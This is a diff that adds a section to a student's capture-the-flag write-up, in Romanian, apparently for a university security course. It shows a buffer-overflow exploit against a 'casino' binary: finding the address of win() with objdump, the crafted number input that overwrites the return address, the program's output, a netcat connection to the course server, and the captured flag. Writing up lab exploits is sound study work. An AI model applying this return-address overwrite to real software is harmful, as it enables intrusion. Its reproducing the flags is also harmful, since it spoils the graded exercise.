@@ -103,6 +103,54 @@ Am  modificat in script apoi am rulat ca si robot-sudo si am obtinut flagul.
 
 ### FLAG: SpeishFlag{RpBElwNQrhVrrYLolrkLrTOXtOQgZJWL}
 
+## TASK3 - BINNARY-EXPLOIT
+
+Ma folosesc de Ghidra ca sa deschid binarul si sa vizualizez codul in c pentru main.c, loop.c si win.c. Din main se intra in loop dar nu se intra si in win, ceea ce eu vreau sa se intample pentru a gasi flagul, astfel ca ceea ce vreau este sa suprascriu adresa de retur din loop ca sa ii dau adresa lui win. Aflu adresa folosind: 
+```
+objdump -t casino | grep win
+
+```
+
+Vreau sa fac buffer overflow si uitandu-ma cu objdump constat ca am nevoie de 37 de caractere de garbage la care adaug adresa pe care o convertesc din hexa in decimal plus inca un 0 si apoi lucky number si x ca sa intru pe conditia cu flagul.
+
+```
+student@uso:~/Desktop/AN_3/ISC/anca_maria.colacel/binary-exploit$ ./casino
+Welcome to the Saint Tropez Virtual Casino!
+Please enter your name:
+anca
+Welcome, anca!
+Your balance: $655
+
+Please enter the list of numbers you want to roll (write 'x' to stop): 
+123 x
+You got: 0 out of 1
+Remaining balance: $554
+Continue? [Y/n]y
+
+Here's your lucky number: 141805
+
+Please enter the list of numbers you want to roll (write 'x' to stop): 
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 134517302 0 141805 x            
+You got: 1 out of 40
+Remaining balance: $454
+Continue? [Y/n]n
+KThxBye!
+File opening failed!
+Note: there is no flag available locally, try it on the remote server!
+
+```
+
+Acesta este outputul obtinut in urma rularii pe local dupa care ma conectez la server folosind comanda
+
+```
+netcat  isc2023.1337.cx 10011
+
+```
+
+si pasii sunt aceeasi ca pe local dar la final se obtine flagul.
+
+### FLAG: SpeishFlag{dTWwdiGKa7iyKqPYJG9rpyxMK06WcjM8}
+
 
 
    
